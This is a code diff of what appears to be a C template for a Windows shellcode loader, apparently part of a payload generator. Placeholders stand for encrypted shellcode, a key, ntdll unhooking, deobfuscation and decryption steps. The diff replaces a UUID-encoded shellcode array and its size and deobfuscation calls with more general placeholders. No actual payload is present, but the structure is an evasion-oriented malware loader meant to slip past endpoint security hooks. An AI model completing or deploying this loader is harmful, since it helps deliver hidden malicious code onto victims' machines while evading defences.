@@ -13,9 +13,7 @@
 
 // {{EXECUTION_FUNCTION_PLACEHOLDER}}
 
-const char* shellcode_uuids[] = { 
-    // {{SHELLCODE_PLACEHOLDER}}
-};
+// {{SHELLCODE_DEFINITION_PLACEHOLDER}}
 
 unsigned char key[] = { 
     // {{KEY_PLACEHOLDER}}
@@ -24,8 +22,7 @@ unsigned char key[] = {
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
     // {{NTDLL_UNHOOK_CALL_PLACEHOLDER}}
     
-    int uuid_count = sizeof(shellcode_uuids) / sizeof(shellcode_uuids[0]);
-    int shellcode_size = uuid_count * 16;
+    // {{SIZE_CALCULATION_PLACEHOLDER}}
 
     PVOID shellcode_mem = NULL;
 
@@ -44,7 +41,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowC
 
     if (shellcode_mem == NULL) return 1;
 
-    deobfuscate_uuid(shellcode_uuids, uuid_count, (unsigned char*)shellcode_mem);
+    // {{DEOBFUSCATION_CALL_PLACEHOLDER}}
 
     // {{DECRYPTION_CALL_PLACEHOLDER}}
 
